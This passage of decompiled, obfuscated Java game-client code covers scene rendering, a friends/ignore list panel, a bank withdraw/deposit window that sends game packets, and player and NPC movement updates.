        efh.method416(byte0 * 48 + 23, byte1 * 48 + 23, i);
        efh.method425(aClass5Array994);
        char c = '\u2600';
        char c1 = '\u1900';
        char c2 = '\u044C';
        char c3 = '\u0378';
		if (FOW)
		{
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		} else {
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		}
        aClass10_739.method298(c, -efh.method421(c, c1), c1, yrot, c3, 0, c2 * 2);
        aClass10_739.method286();
        gfx.fade();
        gfx.fade();
        gfx.method216(0, 0, 512, 6, 0);
        for(int j = 6; j >= 1; j--)
            gfx.method222(0, j, 0, j, 512, 8);

        gfx.method216(0, 194, 512, 20, 0);
        for(int k = 6; k >= 1; k--)
            gfx.method222(0, k, 0, 194 - k, 512, 8);

        gfx.method231(15, 15, anInt948 + 10);
        gfx.method230(anInt954, 0, 0, 512, 200);
        gfx.method227(anInt954);
        c = '\u2400';
        c1 = '\u2400';
        c2 = '\u044C';
        c3 = '\u0378';
if (FOW)
		{
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		} else {
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		}	
        aClass10_739.method298(c, -efh.method421(c, c1), c1, yrot, c3, 0, c2 * 2);
        aClass10_739.method286();
        gfx.fade();
        gfx.fade();
        gfx.method216(0, 0, 512, 6, 0);
        for(int l = 6; l >= 1; l--)
            gfx.method222(0, l, 0, l, 512, 8);

        gfx.method216(0, 194, 512, 20, 0);
        for(int i1 = 6; i1 >= 1; i1--)
            gfx.method222(0, i1, 0, 194 - i1, 512, 8);

        gfx.method231(15, 15, anInt948 + 10);
        gfx.method230(anInt954 + 1, 0, 0, 512, 200);
        gfx.method227(anInt954 + 1);
        for(int j1 = 0; j1 < 64; j1++)
        {
            aClass10_739.method270(efh.aClass5ArrayArray603[0][j1]);
            aClass10_739.method270(efh.aClass5ArrayArray605[1][j1]);
            aClass10_739.method270(efh.aClass5ArrayArray603[1][j1]);
            aClass10_739.method270(efh.aClass5ArrayArray605[2][j1]);
            aClass10_739.method270(efh.aClass5ArrayArray603[2][j1]);
        }

        c = '\u2B80';
        c1 = '\u2880';
        c2 = '\u01F4';
        c3 = '\u0178';
if (FOW)
		{
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		} else {
			aClass10_739.anInt390 = 41000;
			aClass10_739.anInt391 = 41000;
			aClass10_739.anInt392 = 1;
			aClass10_739.anInt393 = 40000;
		}
        aClass10_739.method298(c, -efh.method421(c, c1), c1, yrot, c3, 0, c2 * 2);
        aClass10_739.method286();
        gfx.fade();
        gfx.fade();
        gfx.method216(0, 0, 512, 6, 0);
        for(int k1 = 6; k1 >= 1; k1--)
            gfx.method222(0, k1, 0, k1, 512, 8);

        gfx.method216(0, 194, 512, 20, 0);
        for(int l1 = 6; l1 >= 1; l1--)
            gfx.method222(0, l1, 0, 194, 512, 8);

        gfx.method231(15, 15, anInt948 + 10);
        gfx.method230(anInt948 + 10, 0, 0, 512, 200);
        gfx.method227(anInt948 + 10);
    }

    public final void method78()
    {
        int j = identify.anInt144;
        if((anInt940 & 1) == 1 && method112(anInt940))
            return;
        if((anInt940 & 1) == 0 && method112(anInt940))
        {
            if(method112(anInt940 + 1 & 7))
            {
                anInt940 = anInt940 + 1 & 7;
                return;
            }
            if(method112(anInt940 + 7 & 7))
                anInt940 = anInt940 + 7 & 7;
            return;
        }
        int ai[] = {
            1, -1, 2, -2, 3, -3, 4
        };
        for(int i = 0; i < 7; i++)
        {
            if(!method112(anInt940 + ai[i] + 8 & 7))
                continue;
            anInt940 = anInt940 + ai[i] + 8 & 7;
            break;
        }

        if((anInt940 & 1) == 0 && method112(anInt940))
        {
            if(method112(anInt940 + 1 & 7))
            {
                anInt940 = anInt940 + 1 & 7;
                return;
            }
            if(method112(anInt940 + 7 & 7))
                anInt940 = anInt940 + 7 & 7;
            return;
        } else
        {
            return;
        }
    }

    public final boolean method79(int i)
    {
        for(int j = 0; j < InvCount; j++)
            if(inv[j] == i && isWorn[j] == 1)
                return true;

        return false;
    }

    public final void method80(boolean flag)
    {
        int i3 = identify.anInt144;
        int i = ((Class6) (gfx)).anInt311 - 199;
        int j = 36;
        gfx.method231(i - 49, 3, anInt948 + 5);
        char c = '\304';
        char c1 = '\266';
        int l;
        int k = l = Class6.method223(160, 160, 160);
        if(anInt927 == 0)
            k = Class6.method223(220, 220, 220);
        else
            l = Class6.method223(220, 220, 220);
        gfx.method214(i, j, c / 2, 24, k, 128);
        gfx.method214(i + c / 2, j, c / 2, 24, l, 128);
        gfx.method214(i, j + 24, c, c1 - 24, Class6.method223(220, 220, 220), 128);
        gfx.method218(i, j + 24, c, 0);
        gfx.method219(i + c / 2, j, 24, 0);
        gfx.method218(i, (j + c1) - 16, c, 0);
        gfx.drawString("Friends", i + c / 4, j + 16, 4, 0);
        gfx.drawString("Ignore", i + c / 4 + c / 2, j + 16, 4, 0);
        aClass4_925.method165(anInt926);
        if(anInt927 == 0)
        {
            for(int i1 = 0; i1 < super.anInt624; i1++)
            {
                String s;
                if(super.anIntArray626[i1] == 99)
                    s = "@gre@";
                else
                if(super.anIntArray626[i1] > 0)
                    s = "@yel@";
                else
                    s = "@red@";
                aClass4_925.method167(anInt926, i1, s + fnf.method363(super.aLongArray625[i1]) + "~439~@whi@Remove         WWWWWWWWWW");
            }

        }
        if(anInt927 == 1)
        {
            for(int j1 = 0; j1 < super.anInt627; j1++)
                aClass4_925.method167(anInt926, j1, "@yel@" + fnf.method363(super.aLongArray628[j1]) + "~439~@whi@Remove         WWWWWWWWWW");

        }
        aClass4_925.method142();
        if(anInt927 == 0)
        {
            int k1 = aClass4_925.method174(anInt926);
            if(k1 >= 0 && super.anInt33 < 489)
            {
                if(super.anInt33 > 429)
                    gfx.drawString("Click to remove " + fnf.method363(super.aLongArray625[k1]), i + c / 2, j + 35, 1, 0xffffff);
                else
                if(super.anIntArray626[k1] == 99)
                    gfx.drawString("Click to message " + fnf.method363(super.aLongArray625[k1]), i + c / 2, j + 35, 1, 0xffffff);
                else
                if(super.anIntArray626[k1] > 0)
                    gfx.drawString(fnf.method363(super.aLongArray625[k1]) + " is on world " + super.anIntArray626[k1], i + c / 2, j + 35, 1, 0xffffff);
                else
                    gfx.drawString(fnf.method363(super.aLongArray625[k1]) + " is offline", i + c / 2, j + 35, 1, 0xffffff);
            } else
            {
                gfx.drawString("Click a name to send a message", i + c / 2, j + 35, 1, 0xffffff);
            }
            int k2;
            if(super.anInt33 > i && super.anInt33 < i + c && super.anInt34 > (j + c1) - 16 && super.anInt34 < j + c1)
                k2 = 0xffff00;
            else
                k2 = 0xffffff;
            gfx.drawString("Click here to add a friend", i + c / 2, (j + c1) - 3, 1, k2);
        }
        if(anInt927 == 1)
        {
            int l1 = aClass4_925.method174(anInt926);
            if(l1 >= 0 && super.anInt33 < 489 && super.anInt33 > 429)
            {
                if(super.anInt33 > 429)
                    gfx.drawString("Click to remove " + fnf.method363(super.aLongArray628[l1]), i + c / 2, j + 35, 1, 0xffffff);
            } else
            {
                gfx.drawString("Blocking messages from:", i + c / 2, j + 35, 1, 0xffffff);
            }
            int l2;
            if(super.anInt33 > i && super.anInt33 < i + c && super.anInt34 > (j + c1) - 16 && super.anInt34 < j + c1)
                l2 = 0xffff00;
            else
                l2 = 0xffffff;
            gfx.drawString("Click here to add a name", i + c / 2, (j + c1) - 3, 1, l2);
        }
        if(!flag)
            return;
        i = super.anInt33 - (((Class6) (gfx)).anInt311 - 199);
        j = super.anInt34 - 36;
        if(i >= 0 && j >= 0 && i < 196 && j < 182)
        {
            aClass4_925.method139(i + (((Class6) (gfx)).anInt311 - 199), j + 36, super.anInt36, super.anInt35);
            if(j <= 24 && anInt813 == 1)
                if(i < 98 && anInt927 == 1)
                {
                    anInt927 = 0;
                    aClass4_925.method166(anInt926);
                } else
                if(i > 98 && anInt927 == 0)
                {
                    anInt927 = 1;
                    aClass4_925.method166(anInt926);
                }
            if(anInt813 == 1 && anInt927 == 0)
            {
                int i2 = aClass4_925.method174(anInt926);
                if(i2 >= 0 && super.anInt33 < 489)
                    if(super.anInt33 > 429)
                        method32(super.aLongArray625[i2]);
                    else
                    if(super.anIntArray626[i2] != 0)
                    {
                        anInt931 = 2;
                        aLong928 = super.aLongArray625[i2];
                        super.aString42 = "";
                        super.aString43 = "";
                    }
            }
            if(anInt813 == 1 && anInt927 == 1)
            {
                int j2 = aClass4_925.method174(anInt926);
                if(j2 >= 0 && super.anInt33 < 489 && super.anInt33 > 429)
                    method30(super.aLongArray628[j2]);
            }
            if(j > 166 && anInt813 == 1 && anInt927 == 0)
            {
                anInt931 = 1;
                super.fln = "";
                super.fma = "";
            }
            if(j > 166 && anInt813 == 1 && anInt927 == 1)
            {
                anInt931 = 3;
                super.fln = "";
                super.fma = "";
            }
            anInt813 = 0;
        }
    }

    public final void method81()
    {
        int j9 = identify.anInt144;
        char c = '\u0198';
        char c1 = '\u014E';
        if(anInt812 > 0 && anInt889 <= 48)
            anInt812 = 0;
        if(anInt812 > 1 && anInt889 <= 96)
            anInt812 = 1;
        if(anInt812 > 2 && anInt889 <= 144)
            anInt812 = 2;
        if(anInt834 >= anInt889 || anInt834 < 0)
            anInt834 = -1;
        if(anInt834 != -1 && anIntArray955[anInt834] != anInt835)
        {
            anInt834 = -1;
            anInt835 = -2;
        }
        if(anInt813 != 0)
        {
            anInt813 = 0;
            int i = super.anInt33 - (256 - c / 2);
            int k = super.anInt34 - (170 - c1 / 2);
            if(i >= 0 && k >= 12 && i < 408 && k < 280)
            {
                int i1 = anInt812 * 48;
                for(int l1 = 0; l1 < 6; l1++)
                {
                    for(int j2 = 0; j2 < 8; j2++)
                    {
                        int l6 = 7 + j2 * 49;
                        int j7 = 28 + l1 * 34;
                        if(i > l6 && i < l6 + 49 && k > j7 && k < j7 + 34 && i1 < anInt889 && anIntArray955[i1] != -1)
                        {
                            anInt835 = anIntArray955[i1];
                            anInt834 = i1;
                        }
                        i1++;
                    }

                }

                i = 256 - c / 2;
                k = 170 - c1 / 2;
                int k2;
                if(anInt834 < 0)
                    k2 = -1;
                else
                    k2 = anIntArray955[anInt834];
                if(k2 != -1)
                {
                    int j1 = anIntArray956[anInt834];
                    if(identify.ahl[k2] == 1 && j1 > 1)
                        j1 = 1;
                    if(j1 >= 1 && super.anInt33 >= i + 220 && super.anInt34 >= k + 238 && super.anInt33 < i + 250 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",1);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(1);
                        super.packets.send();
                    }
                    if(j1 >= 5 && super.anInt33 >= i + 250 && super.anInt34 >= k + 238 && super.anInt33 < i + 280 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",5);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(5);
                        super.packets.send();
                    }
                    if(j1 >= 25 && super.anInt33 >= i + 280 && super.anInt34 >= k + 238 && super.anInt33 < i + 305 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",25);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(25);
                        super.packets.send();
                    }
                    if(j1 >= 100 && super.anInt33 >= i + 305 && super.anInt34 >= k + 238 && super.anInt33 < i + 335 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",100);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(100);
                        super.packets.send();
                    }
                    if(j1 >= 500 && super.anInt33 >= i + 335 && super.anInt34 >= k + 238 && super.anInt33 < i + 368 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",500);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(500);
                        super.packets.send();
                    }
                    if(j1 >= 2500 && super.anInt33 >= i + 370 && super.anInt34 >= k + 238 && super.anInt33 < i + 400 && super.anInt34 <= k + 249)
                    {
						System.out.println("Withdraw(" + k2 + ",2500);");
                        super.packets.id(131);
                        super.packets.cmd(k2);
                        super.packets.cmd(2500);
                        super.packets.send();
                    }
                    if(InvCount(k2) >= 1 && super.anInt33 >= i + 220 && super.anInt34 >= k + 263 && super.anInt33 < i + 250 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",1);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(1);
                        super.packets.send();
                    }
                    if(InvCount(k2) >= 5 && super.anInt33 >= i + 250 && super.anInt34 >= k + 263 && super.anInt33 < i + 280 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",5);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(5);
                        super.packets.send();
                    }
                    if(InvCount(k2) >= 25 && super.anInt33 >= i + 280 && super.anInt34 >= k + 263 && super.anInt33 < i + 305 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",25);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(25);
                        super.packets.send();;
                    }
                    if(InvCount(k2) >= 100 && super.anInt33 >= i + 305 && super.anInt34 >= k + 263 && super.anInt33 < i + 335 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",100);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(100);
                        super.packets.send();
                    }
                    if(InvCount(k2) >= 500 && super.anInt33 >= i + 335 && super.anInt34 >= k + 263 && super.anInt33 < i + 368 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",500);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(500);
                        super.packets.send();
                    }
                    if(InvCount(k2) >= 2500 && super.anInt33 >= i + 370 && super.anInt34 >= k + 263 && super.anInt33 < i + 400 && super.anInt34 <= k + 274)
                    {
						System.out.println("Deposit(" + k2 + ",2500);");
                        super.packets.id(190);
                        super.packets.cmd(k2);
                        super.packets.cmd(2500);
                        super.packets.send();
                    }
                }
            } else
            if(anInt889 > 48 && i >= 50 && i <= 115 && k <= 12)
                anInt812 = 0;
            else
            if(anInt889 > 48 && i >= 115 && i <= 180 && k <= 12)
                anInt812 = 1;
            else
            if(anInt889 > 96 && i >= 180 && i <= 245 && k <= 12)
                anInt812 = 2;
            else
            if(anInt889 > 144 && i >= 245 && i <= 310 && k <= 12)
            {
                anInt812 = 3;
            } else
            {
                super.packets.id(78);
                super.packets.send();
                bank = false;
                return;
            }
        }
        int j = 256 - c / 2;
        int l = 170 - c1 / 2;
        gfx.method216(j, l, 408, 12, 192);
        int k1 = 0x989898;
        gfx.method214(j, l + 12, 408, 17, k1, 160);
        gfx.method214(j, l + 29, 8, 204, k1, 160);
        gfx.method214(j + 399, l + 29, 9, 204, k1, 160);
        gfx.method214(j, l + 233, 408, 47, k1, 160);
        gfx.method257("Bank", j + 1, l + 10, 1, 0xffffff);
        int i2 = 50;
        if(anInt889 > 48)
        {
            int l2 = 0xffffff;
            if(anInt812 == 0)
                l2 = 0xff0000;
            else
            if(super.anInt33 > j + i2 && super.anInt34 >= l && super.anInt33 < j + i2 + 65 && super.anInt34 < l + 12)
                l2 = 0xffff00;
            gfx.method257("<page 1>", j + i2, l + 10, 1, l2);
            i2 += 65;
            l2 = 0xffffff;
            if(anInt812 == 1)
                l2 = 0xff0000;
            else
            if(super.anInt33 > j + i2 && super.anInt34 >= l && super.anInt33 < j + i2 + 65 && super.anInt34 < l + 12)
                l2 = 0xffff00;
            gfx.method257("<page 2>", j + i2, l + 10, 1, l2);
            i2 += 65;
        }
        if(anInt889 > 96)
        {
            int i3 = 0xffffff;
            if(anInt812 == 2)
                i3 = 0xff0000;
            else
            if(super.anInt33 > j + i2 && super.anInt34 >= l && super.anInt33 < j + i2 + 65 && super.anInt34 < l + 12)
                i3 = 0xffff00;
            gfx.method257("<page 3>", j + i2, l + 10, 1, i3);
            i2 += 65;
        }
        if(anInt889 > 144)
        {
            int j3 = 0xffffff;
            if(anInt812 == 3)
                j3 = 0xff0000;
            else
            if(super.anInt33 > j + i2 && super.anInt34 >= l && super.anInt33 < j + i2 + 65 && super.anInt34 < l + 12)
                j3 = 0xffff00;
            gfx.method257("<page 4>", j + i2, l + 10, 1, j3);
            i2 += 65;
        }
        int k3 = 0xffffff;
        if(super.anInt33 > j + 320 && super.anInt34 >= l && super.anInt33 < j + 408 && super.anInt34 < l + 12)
            k3 = 0xff0000;
        gfx.method254("Close window", j + 406, l + 10, 1, k3);
        gfx.method257("Number in bank in green", j + 7, l + 24, 1, 65280);
        gfx.method257("Number held in blue", j + 289, l + 24, 1, 65535);
        int i7 = 0xd0d0d0;
        int k7 = anInt812 * 48;
        for(int i8 = 0; i8 < 6; i8++)
        {
            for(int j8 = 0; j8 < 8; j8++)
            {
                int l8 = j + 7 + j8 * 49;
                int i9 = l + 28 + i8 * 34;
                if(anInt834 == k7)
                    gfx.method214(l8, i9, 49, 34, 0xff0000, 160);
                else
                    gfx.method214(l8, i9, 49, 34, i7, 160);
                gfx.method217(l8, i9, 50, 35, 0);
                if(k7 < anInt889 && anIntArray955[k7] != -1)
                {
                    gfx.method247(l8, i9, 48, 32, anInt950 + identify.anIntArray53[anIntArray955[k7]], identify.anIntArray58[anIntArray955[k7]], 0, 0, false);
                    gfx.method257(String.valueOf(anIntArray956[k7]), l8 + 1, i9 + 10, 1, 65280);
                    gfx.method254(String.valueOf(InvCount(anIntArray955[k7])), l8 + 47, i9 + 29, 1, 65535);
                }
                k7++;
            }

        }

        gfx.method218(j + 5, l + 256, 398, 0);
        if(anInt834 == -1)
        {
            gfx.drawString("Select an object to withdraw or deposit", j + 204, l + 248, 3, 0xffff00);
            return;
        }
        int k8;
        if(anInt834 < 0)
            k8 = -1;
        else
            k8 = anIntArray955[anInt834];
        if(k8 != -1)
        {
            int l7 = anIntArray956[anInt834];
            if(identify.ahl[k8] == 1 && l7 > 1)
                l7 = 1;
            if(l7 > 0)
            {
                gfx.method257("Withdraw " + identify.itemName[k8], j + 2, l + 248, 1, 0xffffff);
                int l3 = 0xffffff;
                if(super.anInt33 >= j + 220 && super.anInt34 >= l + 238 && super.anInt33 < j + 250 && super.anInt34 <= l + 249)
                    l3 = 0xff0000;
                gfx.method257("One", j + 222, l + 248, 1, l3);
                if(l7 >= 5)
                {
                    int i4 = 0xffffff;
                    if(super.anInt33 >= j + 250 && super.anInt34 >= l + 238 && super.anInt33 < j + 280 && super.anInt34 <= l + 249)
                        i4 = 0xff0000;
                    gfx.method257("Five", j + 252, l + 248, 1, i4);
                }
                if(l7 >= 25)
                {
                    int j4 = 0xffffff;
                    if(super.anInt33 >= j + 280 && super.anInt34 >= l + 238 && super.anInt33 < j + 305 && super.anInt34 <= l + 249)
                        j4 = 0xff0000;
                    gfx.method257("25", j + 282, l + 248, 1, j4);
                }
                if(l7 >= 100)
                {
                    int k4 = 0xffffff;
                    if(super.anInt33 >= j + 305 && super.anInt34 >= l + 238 && super.anInt33 < j + 335 && super.anInt34 <= l + 249)
                        k4 = 0xff0000;
                    gfx.method257("100", j + 307, l + 248, 1, k4);
                }
                if(l7 >= 500)
                {
                    int l4 = 0xffffff;
                    if(super.anInt33 >= j + 335 && super.anInt34 >= l + 238 && super.anInt33 < j + 368 && super.anInt34 <= l + 249)
                        l4 = 0xff0000;
                    gfx.method257("500", j + 337, l + 248, 1, l4);
                }
                if(l7 >= 2500)
                {
                    int i5 = 0xffffff;
                    if(super.anInt33 >= j + 370 && super.anInt34 >= l + 238 && super.anInt33 < j + 400 && super.anInt34 <= l + 249)
                        i5 = 0xff0000;
                    gfx.method257("2500", j + 370, l + 248, 1, i5);
                }
            }
            if(InvCount(k8) > 0)
            {
                gfx.method257("Deposit " + identify.itemName[k8], j + 2, l + 273, 1, 0xffffff);
                int j5 = 0xffffff;
                if(super.anInt33 >= j + 220 && super.anInt34 >= l + 263 && super.anInt33 < j + 250 && super.anInt34 <= l + 274)
                    j5 = 0xff0000;
                gfx.method257("One", j + 222, l + 273, 1, j5);
                if(InvCount(k8) >= 5)
                {
                    int k5 = 0xffffff;
                    if(super.anInt33 >= j + 250 && super.anInt34 >= l + 263 && super.anInt33 < j + 280 && super.anInt34 <= l + 274)
                        k5 = 0xff0000;
                    gfx.method257("Five", j + 252, l + 273, 1, k5);
                }
                if(InvCount(k8) >= 25)
                {
                    int l5 = 0xffffff;
                    if(super.anInt33 >= j + 280 && super.anInt34 >= l + 263 && super.anInt33 < j + 305 && super.anInt34 <= l + 274)
                        l5 = 0xff0000;
                    gfx.method257("25", j + 282, l + 273, 1, l5);
                }
                if(InvCount(k8) >= 100)
                {
                    int i6 = 0xffffff;
                    if(super.anInt33 >= j + 305 && super.anInt34 >= l + 263 && super.anInt33 < j + 335 && super.anInt34 <= l + 274)
                        i6 = 0xff0000;
                    gfx.method257("100", j + 307, l + 273, 1, i6);
                }
                if(InvCount(k8) >= 500)
                {
                    int j6 = 0xffffff;
                    if(super.anInt33 >= j + 335 && super.anInt34 >= l + 263 && super.anInt33 < j + 368 && super.anInt34 <= l + 274)
                        j6 = 0xff0000;
                    gfx.method257("500", j + 337, l + 273, 1, j6);
                }
                if(InvCount(k8) >= 2500)
                {
                    int k6 = 0xffffff;
                    if(super.anInt33 >= j + 370 && super.anInt34 >= l + 263 && super.anInt33 < j + 400 && super.anInt34 <= l + 274)
                        k6 = 0xff0000;
                    gfx.method257("2500", j + 370, l + 273, 1, k6);
                }
            }
        }
    }


    public final void method82()
    {
        int i6 = identify.anInt144;
        if(anInt749 > 1)
            anInt749--;
        method25();
        if(anInt746 > 0)
            anInt746--;
        if(myplayer.hah == 8 || myplayer.hah == 9)
            anInt869 = 500;
        if(anInt869 > 0)
            anInt869--;
        if(aBoolean992)
        {
            method120();
            return;
        }
        for(int i = 0; i < playerCount; i++)
        {
            Class2 class2 = player[i];
            int k = (class2.anInt156 + 1) % 10;
            if(class2.anInt155 != k)
            {
                int i1 = -1;
                int l2 = class2.anInt155;
                int j4;
                if(l2 < k)
                    j4 = k - l2;
                else
                    j4 = (10 + k) - l2;
                int j5 = 4;
                if(j4 > 2)
                    j5 = (j4 - 1) * 4;
                if(class2.anIntArray157[l2] - class2.x > absnpc * 3 || class2.anIntArray158[l2] - class2.y > absnpc * 3 || class2.anIntArray157[l2] - class2.x < -absnpc * 3 || class2.anIntArray158[l2] - class2.y < -absnpc * 3 || j4 > 8)
                {
                    class2.x = class2.anIntArray157[l2];
                    class2.y = class2.anIntArray158[l2];
                } else
                {
                    if(class2.x < class2.anIntArray157[l2])
                    {
                        class2.x += j5;
                        class2.anInt152++;
                        i1 = 2;
                    } else
                    if(class2.x > class2.anIntArray157[l2])
                    {
                        class2.x -= j5;
                        class2.anInt152++;
                        i1 = 6;
                    }
                    if(class2.x - class2.anIntArray157[l2] < j5 && class2.x - class2.anIntArray157[l2] > -j5)
                        class2.x = class2.anIntArray157[l2];
                    if(class2.y < class2.anIntArray158[l2])
                    {
                        class2.y += j5;
                        class2.anInt152++;
                        if(i1 == -1)
                            i1 = 4;
                        else
                        if(i1 == 2)
                            i1 = 3;
                        else
                            i1 = 5;
                    } else
                    if(class2.y > class2.anIntArray158[l2])
                    {
                        class2.y -= j5;
                        class2.anInt152++;
                        if(i1 == -1)
                            i1 = 0;
                        else
                        if(i1 == 2)
                            i1 = 1;
                        else
                            i1 = 7;
                    }
                    if(class2.y - class2.anIntArray158[l2] < j5 && class2.y - class2.anIntArray158[l2] > -j5)
                        class2.y = class2.anIntArray158[l2];
                }
                if(i1 != -1)
                    class2.hah = i1;
                if(class2.x == class2.anIntArray157[l2] && class2.y == class2.anIntArray158[l2])
                    class2.anInt155 = (l2 + 1) % 10;
            } else
            {
                class2.hah = class2.anInt154;
            }
            if(class2.lastSaidTime > 0)
                class2.lastSaidTime--;
            if(class2.anInt163 > 0)
                class2.anInt163--;
            if(class2.anInt167 > 0)
                class2.anInt167--;
            if(enb > 0)
            {
                enb--;
                if(enb == 0)
                    DisplayMessage("You have been granted another life. Be more careful this time!", 3);
                if(enb == 0)
                    DisplayMessage("You retain your skills. Your objects land where you died", 3);
            }
        }

        for(int j = 0; j < npcCount; j++)
        {
            Class2 class2_1 = npc[j];
            int j1 = (class2_1.anInt156 + 1) % 10;
            if(class2_1.anInt155 != j1)
            {
                int i3 = -1;
                int k4 = class2_1.anInt155;
                int k5;
                if(k4 < j1)
                    k5 = j1 - k4;
                else
                    k5 = (10 + j1) - k4;
                int l5 = 4;
                if(k5 > 2)
                    l5 = (k5 - 1) * 4;
                if(class2_1.anIntArray157[k4] - class2_1.x > absnpc * 3 || class2_1.anIntArray158[k4] - class2_1.y > absnpc * 3 || class2_1.anIntArray157[k4] - class2_1.x < -absnpc * 3 || class2_1.anIntArray158[k4] - class2_1.y < -absnpc * 3 || k5 > 8)
                {
                    class2_1.x = class2_1.anIntArray157[k4];
                    class2_1.y = class2_1.anIntArray158[k4];
                } else
                {
                    if(class2_1.x < class2_1.anIntArray157[k4])
                    {
                        class2_1.x += l5;
                        class2_1.anInt152++;
                        i3 = 2;
                    } else
                    if(class2_1.x > class2_1.anIntArray157[k4])
                    {
                        class2_1.x -= l5;
                        class2_1.anInt152++;
                        i3 = 6;
                    }
                    if(class2_1.x - class2_1.anIntArray157[k4] < l5 && class2_1.x - class2_1.anIntArray157[k4] > -l5)
                        class2_1.x = class2_1.anIntArray157[k4];
                    if(class2_1.y < class2_1.anIntArray158[k4])
                    {
                        class2_1.y += l5;
                        class2_1.anInt152++;
                        if(i3 == -1)
                            i3 = 4;
                        else
                        if(i3 == 2)
                            i3 = 3;
                        else
                            i3 = 5;
                    } else
                    if(class2_1.y > class2_1.anIntArray158[k4])
                    {
                        class2_1.y -= l5;
                        class2_1.anInt152++;
                        if(i3 == -1)
                            i3 = 0;
                        else
                        if(i3 == 2)
                            i3 = 1;
                        else
                            i3 = 7;
                    }
                    if(class2_1.y - class2_1.anIntArray158[k4] < l5 && class2_1.y - class2_1.anIntArray158[k4] > -l5)
                        class2_1.y = class2_1.anIntArray158[k4];
                }
                if(i3 != -1)
                    class2_1.hah = i3;
                if(class2_1.x == class2_1.anIntArray157[k4] && class2_1.y == class2_1.anIntArray158[k4])
                    class2_1.anInt155 = (k4 + 1) % 10;
            } else
            {
                class2_1.hah = class2_1.anInt154;
                if(class2_1.type == 43)
                    class2_1.anInt152++;
            }
            if(class2_1.lastSaidTime > 0)
                class2_1.lastSaidTime--;
            if(class2_1.anInt163 > 0)
                class2_1.anInt163--;
            if(class2_1.anInt167 > 0)
                class2_1.anInt167--;
        }

        if(selectedmenu != 2)
        {
            if(Class6.anInt346 > 0)
                anInt884++;
            if(Class6.anInt347 > 0)
                anInt884 = 0;
            Class6.anInt346 = 0;
            Class6.anInt347 = 0;
        }
        for(int l = 0; l < playerCount; l++)
        {
            Class2 class2_2 = player[l];
            if(class2_2.anInt176 > 0)
                class2_2.anInt176--;
        }

        if(aBoolean757)
        {
            if(anInt714 - myplayer.x < -500 || anInt714 - myplayer.x > 500 || anInt715 - myplayer.y < -500 || anInt715 - myplayer.y > 500)
            {
                anInt714 = myplayer.x;
                anInt715 = myplayer.y;
            }
        } else
        {
            if(anInt714 - myplayer.x < -500 || anInt714 - myplayer.x > 500 || anInt715 - myplayer.y < -500 || anInt715 - myplayer.y > 500)
            {
                anInt714 = myplayer.x;
                anInt715 = myplayer.y;
            }
            if(anInt714 != myplayer.x)
                anInt714 += (myplayer.x - anInt714) / (16 + (anInt683 - 500) / 15);
            if(anInt715 != myplayer.y)
                anInt715 += (myplayer.y - anInt715) / (16 + (anInt683 - 500) / 15);
            if(aBoolean675)
            {
                int k1 = anInt940 * 32;
                int j3 = k1 - anInt729;
                byte byte0 = 1;
                if(j3 != 0)
                {
                    anInt941++;
                    if(j3 > 128)
                    {
                        byte0 = -1;
                        j3 = 256 - j3;
                    } else
                    if(j3 > 0)
                        byte0 = 1;
                    else
                    if(j3 < -128)
                    {
                        byte0 = 1;
                        j3 = 256 + j3;
                    } else
                    if(j3 < 0)
                    {
                        byte0 = -1;
                        j3 = -j3;
                    }
                    anInt729 += ((anInt941 * j3 + 255) / 256) * byte0;
                    anInt729 &= 0xff;
                } else
                {
                    anInt941 = 0;
                }
            }
        }
        if(anInt884 > 20)
        {
            dee = false;
            anInt884 = 0;
        }
        if(sleeping)
        {
            if(super.fma.length() > 0)
                if(super.fma.equalsIgnoreCase("::lostcon") && !aBoolean979)
                    super.packets.method329();
                else
                if(super.fma.equalsIgnoreCase("::closecon") && !aBoolean979)
                {
                    method22();
                } else
                {
                    super.packets.id(142);
                    super.packets.hfk(super.fma);
                    if(!dee)
                    {
                        super.packets.var(0);
                        dee = true;
                    }
                    super.packets.send();
                    super.fln = "";
                    super.fma = "";
                    ejk = "Please wait...";
                }
            if(super.anInt36 == 1 && super.anInt34 > 275 && super.anInt34 < 310 && super.anInt33 > 56 && super.anInt33 < 456)
            {
                super.packets.id(142);
                super.packets.hfk("-null-");
                if(!dee)
                {
                    super.packets.var(0);
                    dee = true;
                }
                super.packets.send();
                super.fln = "";
                super.fma = "";
                ejk = "Please wait...";
            }
            super.anInt36 = 0;
            return;
        }
        if(super.anInt34 > anInt677 - 4)
        {
